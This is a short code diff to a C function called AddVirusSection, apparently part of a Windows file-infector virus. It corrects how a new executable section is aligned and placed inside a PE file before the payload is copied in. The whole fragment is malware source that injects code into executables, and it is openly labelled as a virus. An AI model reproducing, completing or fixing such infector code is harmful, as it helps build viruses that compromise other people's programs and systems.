@@ -74,19 +74,18 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, 
 
     p_image_section_header[i].Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA;
 
-    p_image_section_header[i].PointerToRawData = Align(
-        (DWORD)(p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData),
-        file_alignment
-        );
+    *(DWORD*)file_size = Align(*(DWORD*)file_size, file_alignment);
 
-    p_image_section_header[i].VirtualAddress = Align(
-        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize,
-        section_alignment
-        );
+    p_image_section_header[i].PointerToRawData = *(DWORD*)file_size;
 
     p_image_section_header[i].SizeOfRawData = Align(
         section_size,
-        section_alignment);
+        file_alignment);
+
+    p_image_section_header[i].VirtualAddress = Align(
+        p_image_section_header[i - 1].VirtualAddress + p_image_section_header[i - 1].Misc.VirtualSize,
+        section_alignment
+    );
 
     p_image_section_header[i].Misc.VirtualSize = section_size;
 
@@ -100,8 +99,6 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, 
     p_image_section_header[i].Name[7] = 0;
 
     MemCopy((unsigned char *)file_data + p_image_section_header[i].PointerToRawData, section_data, section_size);
-
-    *(DWORD*)file_size = Align(*(DWORD *)file_size, file_alignment);
 
     return &p_image_section_header[i];
 }
